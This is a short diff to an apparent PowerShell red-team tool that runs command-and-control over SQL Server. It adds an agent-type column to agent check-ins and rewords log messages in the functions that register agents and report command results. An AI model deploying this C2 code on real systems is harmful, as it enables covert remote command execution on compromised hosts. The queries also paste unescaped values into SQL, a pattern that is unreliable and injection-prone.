@@ -774,6 +774,7 @@ Function Install-SQLC2
                 (
 	                [aid] int IDENTITY(1,1) PRIMARY KEY,
 	                [servername]varchar(MAX),
+	                [agentype]varchar(MAX),
 	                [lastcheckin]DateTime default (Getdate()),
                 );SELECT name FROM sys.tables WHERE name = 'C2COMMANDS'"
         
@@ -902,7 +903,7 @@ Function Register-SQLC2Agent
         $Query = "
              -- checkin as agent
             IF not Exists (SELECT * FROM dbo.C2Agents WHERE servername = '$env:COMPUTERNAME')
-	            INSERT dbo.C2Agents (servername) VALUES ('$env:COMPUTERNAME')
+	            INSERT dbo.C2Agents (servername,agentype) VALUES ('$env:COMPUTERNAME','PsProcess')
             ELSE
 	        UPDATE dbo.C2Agents SET lastcheckin = (select GETDATE ())
             WHERE servername like '$env:COMPUTERNAME'"
@@ -910,7 +911,7 @@ Function Register-SQLC2Agent
         # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose
 
-        Write-Verbose "$instance : $env:COMPUTERNAME registered as agent."
+        Write-Verbose "$instance : $env:COMPUTERNAME agent registered/checked in."
     }
 
     End
@@ -1442,7 +1443,7 @@ Function Invoke-SQLC2Command
         Register-SQLC2Agent -Username $Username -Password $Password -Instance $Instance -Database $Database -SuppressVerbose | Out-Null
 
         # Setup query to grab commands      
-        Write-Verbose -Message "$Instance : Send command update to $Instance for command $Cid."  
+        Write-Verbose -Message "$Instance : Send command results to $Instance for command $Cid."  
         $Query = "
              -- update command request from server            
 	        UPDATE dbo.C2COMMANDS SET lastupdate = (select GETDATE ()),result = '$CommandResults',status='$CommandStatus',command='$Command'
